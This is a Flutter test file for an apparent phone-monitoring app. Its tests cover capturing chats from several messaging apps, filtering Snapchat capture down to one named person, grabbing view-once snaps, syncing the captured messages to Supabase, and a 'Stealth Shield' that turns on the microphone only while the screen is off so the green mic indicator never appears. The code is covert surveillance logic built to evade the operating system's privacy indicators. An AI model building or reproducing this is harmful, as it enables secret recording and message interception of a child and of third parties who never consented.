import 'package:flutter_test/flutter_test.dart';
import 'package:vyra_p/models/chat_message.dart';

void main() {
  group('Snapchat Exclusive Harshit Kamboj & Stealth Shield Deep Verification', () {
    test('1. Contact Normalization accurately matches Harshit in phonebook and Snapchat/Instagram', () {
      bool isWatchlistContact(String name) {
        final lower = name.toLowerCase();
        return lower.contains('harshit') || lower.contains('kamboj');
      }

      String normalizeContactName(String raw) {
        final lower = raw.toLowerCase().trim();
        if (lower.contains('harshit') || lower.contains('kamboj')) {
          return 'Harshit Kamboj';
        }
        return raw.trim();
      }

      // Case 1: Phonebook saved as "Harshit"
      expect(isWatchlistContact('Harshit'), isTrue);
      expect(normalizeContactName('Harshit'), equals('Harshit Kamboj'));

      // Case 2: Snapchat / Instagram handle or display name "Harshit kamboj" / "harshit_kamboj97"
      expect(isWatchlistContact('Harshit kamboj'), isTrue);
      expect(normalizeContactName('Harshit kamboj'), equals('Harshit Kamboj'));
      expect(isWatchlistContact('harshit_kamboj97'), isTrue);
      expect(normalizeContactName('harshit_kamboj97'), equals('Harshit Kamboj'));

      // Case 3: Other random contacts in Snapchat must return false
      expect(isWatchlistContact('Rahul Sharma'), isFalse);
      expect(normalizeContactName('Rahul Sharma'), equals('Rahul Sharma'));
      expect(isWatchlistContact('Snapchat Team'), isFalse);
      expect(isWatchlistContact('Priya Singh'), isFalse);
    });

    test('2. Snapchat Filter: Exclusively tracks Harshit Kamboj, drops all other Snapchat chats', () {
      bool isWatchlistContact(String name) {
        final lower = name.toLowerCase();
        return lower.contains('harshit') || lower.contains('kamboj');
      }

      bool shouldCaptureChat(String appName, String contactName) {
        if (appName == 'Snapchat') {
          // STRICT SNAPCHAT WATCHLIST FILTER: Only Harshit Kamboj
          return isWatchlistContact(contactName);
        }
        // Other apps (WhatsApp, Instagram, Telegram) capture all contacts
        return true;
      }

      // Snapchat Tests
      expect(shouldCaptureChat('Snapchat', 'Harshit'), isTrue);
      expect(shouldCaptureChat('Snapchat', 'Harshit kamboj'), isTrue);
      expect(shouldCaptureChat('Snapchat', 'Rohit Mehra'), isFalse);
      expect(shouldCaptureChat('Snapchat', 'School Group'), isFalse);
      expect(shouldCaptureChat('Snapchat', 'Besties'), isFalse);

      // Other Apps Tests (Must continue capturing everyone)
      expect(shouldCaptureChat('WhatsApp', 'Rohit Mehra'), isTrue);
      expect(shouldCaptureChat('Instagram', 'Ananya Panday'), isTrue);
      expect(shouldCaptureChat('Telegram', 'Study Group'), isTrue);
    });

    test('3. Snapchat 1-View Snap & OCR Media Filter strictly targets Harshit Kamboj', () {
      bool isWatchlistContact(String name) {
        final lower = name.toLowerCase();
        return lower.contains('harshit') || lower.contains('kamboj');
      }

      bool shouldCaptureOneViewSnap(String appName, String sender) {
        if (appName.toLowerCase().contains('snapchat')) {
          return isWatchlistContact(sender);
        }
        return true;
      }

      expect(shouldCaptureOneViewSnap('Snapchat', 'Harshit Kamboj'), isTrue);
      expect(shouldCaptureOneViewSnap('Snapchat', 'Harshit'), isTrue);
      expect(shouldCaptureOneViewSnap('Snapchat', 'Random Friend'), isFalse);
      expect(shouldCaptureOneViewSnap('Snapchat', 'Snapchat Friend'), isFalse);

      // Instagram 1-view media captured regardless
      expect(shouldCaptureOneViewSnap('Instagram', 'Random Friend'), isTrue);
    });

    test('4. Supabase Incremental Watermark: Skips already loaded local records', () {
      final localChats = <ChatMessage>[
        ChatMessage(
          id: 'msg_100',
          appType: AppType.snapchat,
          contactName: 'Harshit Kamboj',
          contactIdentifier: 'Harshit Kamboj',
          messageText: 'Meet at 5 PM',
          timestamp: DateTime.fromMillisecondsSinceEpoch(1700000100000),
          isIncoming: true,
          isDeletedBackup: false,
          isWatchlistTarget: true,
        ),
        ChatMessage(
          id: 'msg_200',
          appType: AppType.snapchat,
          contactName: 'Harshit Kamboj',
          contactIdentifier: 'Harshit Kamboj',
          messageText: 'Did you bring the file?',
          timestamp: DateTime.fromMillisecondsSinceEpoch(1700000200000),
          isIncoming: false,
          isDeletedBackup: false,
          isWatchlistTarget: true,
        ),
      ];

      int getLatestWatermark(List<ChatMessage> items) {
        if (items.isEmpty) return 0;
        int maxTs = 0;
        for (final item in items) {
          final ts = item.timestamp.millisecondsSinceEpoch;
          if (ts > maxTs) maxTs = ts;
        }
        return maxTs;
      }

      final watermark = getLatestWatermark(localChats);
      expect(watermark, equals(1700000200000));

      // Simulate incoming raw records from Supabase query where timestamp_ms > watermark
      final incomingSupabaseRecords = [
        {'id': 'msg_100', 'timestamp_ms': 1700000100000, 'text': 'Duplicate old'},
        {'id': 'msg_200', 'timestamp_ms': 1700000200000, 'text': 'Duplicate old'},
        {'id': 'msg_300', 'timestamp_ms': 1700000300000, 'text': 'Brand new message from Harshit'},
      ];

      // Filtering with watermark strictly fetches only strictly newer items
      final strictlyNewRecords = incomingSupabaseRecords
          .where((r) => (r['timestamp_ms'] as int) > watermark)
          .toList();

      expect(strictlyNewRecords.length, equals(1));
      expect(strictlyNewRecords.first['id'], equals('msg_300'));
      expect(strictlyNewRecords.first['text'], equals('Brand new message from Harshit'));
    });

    test('5. Stealth Shield Screen Off Debounce: Quick screen toggle prevents green mic indicator', () {
      var isMicActive = false;
      var pendingDebounceTimerActive = false;

      void onScreenOff({required bool isStealthEnabled}) {
        if (!isStealthEnabled) return;
        // Schedule 10s debounce
        pendingDebounceTimerActive = true;
      }

      void onScreenOn() {
        // Instant cancel of debounce
        pendingDebounceTimerActive = false;
        isMicActive = false;
      }

      void onDebounceTimerFired() {
        if (pendingDebounceTimerActive) {
          isMicActive = true;
          pendingDebounceTimerActive = false;
        }
      }

      // Scenario A: Child quickly locks and unlocks phone (screen off -> screen on after 2 seconds)
      onScreenOff(isStealthEnabled: true);
      expect(pendingDebounceTimerActive, isTrue);
      expect(isMicActive, isFalse); // Mic NOT activated yet

      // Screen turns ON before 10 seconds:
      onScreenOn();
      expect(pendingDebounceTimerActive, isFalse);
      expect(isMicActive, isFalse); // Green mic dot was NEVER shown!

      // Scenario B: Child puts phone in pocket and screen stays off for > 10 seconds
      onScreenOff(isStealthEnabled: true);
      expect(pendingDebounceTimerActive, isTrue);
      onDebounceTimerFired(); // 10s elapsed
      expect(isMicActive, isTrue); // Now ambient logging safely activates

      // Child pulls phone out of pocket and screen wakes up
      onScreenOn();
      expect(isMicActive, isFalse); // Instantly killed, 0ms green dot on screen wake!
    });
  });
}
